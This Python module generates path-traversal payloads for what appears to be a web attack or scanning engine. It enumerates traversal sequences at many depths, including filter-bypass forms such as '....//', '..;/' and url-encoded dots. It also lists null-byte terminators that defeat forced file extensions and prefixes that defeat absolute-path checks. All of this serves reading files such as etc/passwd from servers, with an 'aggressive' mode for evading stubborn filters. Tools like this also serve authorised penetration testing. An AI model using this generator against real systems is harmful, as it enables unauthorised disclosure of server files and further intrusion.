"""
Traversal payload generation.

The generator produces path-traversal sequences across a range of depths and
separator styles, plus prefix/suffix bypass tricks that defeat common
server-side sanitisation (extension appending, ``str_replace('../','')`` style
filters, and naive absolute-path checks).
"""
from __future__ import annotations

from typing import Iterator, List, Optional

# Traversal "step" strings. The engine multiplies these by a depth counter.
TRAVERSAL_STEPS: List[str] = [
    "../",           # canonical
    "..\\",          # windows
    "....//",        # collapses to ../ after one round of str_replace('../','')
    "....\\/",       # windows variant of the same
    "..././",        # dot-injection
    "..;/",          # tomcat/servlet path-parameter bypass
    "%2e%2e/",       # url-encoded dots
    "..%2f",         # url-encoded slash
    "%2e%2e%2f",     # fully url-encoded
]

# Null-byte and truncation suffixes to defeat forced extension appends
# (e.g. include($_GET['p'] . '.php')). Effective on legacy PHP / other runtimes.
TERMINATORS: List[str] = [
    "",
    "\x00",          # classic null byte (PHP < 5.3.4)
    "%00",           # url-encoded null byte
    "\x00.php",
    "%00.php",
    "?",             # query terminator for some wrappers
    "#",             # fragment terminator
]

# Prefixes that reset the path or bypass a required leading directory.
PREFIXES: List[str] = [
    "",
    "/",             # absolute
    "./",
]


def depth_sequence(min_depth: int, max_depth: int) -> Iterator[int]:
    """Yield depths widest-first is usually best, but breadth-first from a
    sensible middle converges fastest on real targets."""
    order: List[int] = []
    # Try common depths first, then fill the rest.
    for common in (6, 8, 4, 10, 3, 12, 5, 7, 2, 9, 1, 11):
        if min_depth <= common <= max_depth and common not in order:
            order.append(common)
    for d in range(min_depth, max_depth + 1):
        if d not in order:
            order.append(d)
    yield from order


def generate(
    target_file: str,
    *,
    min_depth: int = 1,
    max_depth: int = 12,
    steps: Optional[List[str]] = None,
    prefixes: Optional[List[str]] = None,
    terminators: Optional[List[str]] = None,
    include_absolute: bool = True,
    aggressive: bool = False,
) -> Iterator[str]:
    """
    Yield candidate traversal payloads for ``target_file`` (e.g. ``etc/passwd``).

    Payloads are yielded lazily so the engine can stop as soon as one confirms.
    In the default (non-aggressive) profile a tight, high-signal subset of
    separators, prefixes and terminators is used so a single URL finishes in
    seconds; ``aggressive=True`` opens up the full cartesian space for evading
    stubborn filters.
    """
    if steps is None:
        steps = TRAVERSAL_STEPS if aggressive else TRAVERSAL_STEPS[:5]
    if prefixes is None:
        prefixes = PREFIXES if aggressive else ["", "/"]
    if terminators is None:
        terminators = TERMINATORS if aggressive else ["", "%00", "\x00"]
    target = target_file.lstrip("/")

    seen: set = set()

    def _emit(payload: str) -> Optional[str]:
        if payload in seen:
            return None
        seen.add(payload)
        return payload

    # Absolute path attempts (php://filter, allow_url handling, chroot-less apps).
    if include_absolute:
        for pfx in ("/", ""):
            cand = _emit(pfx + target)
            if cand:
                yield cand

    for depth in depth_sequence(min_depth, max_depth):
        for step in steps:
            traversal = step * depth
            for pfx in prefixes:
                for term in terminators:
                    payload = f"{pfx}{traversal}{target}{term}"
                    cand = _emit(payload)
                    if cand is not None:
                        yield cand
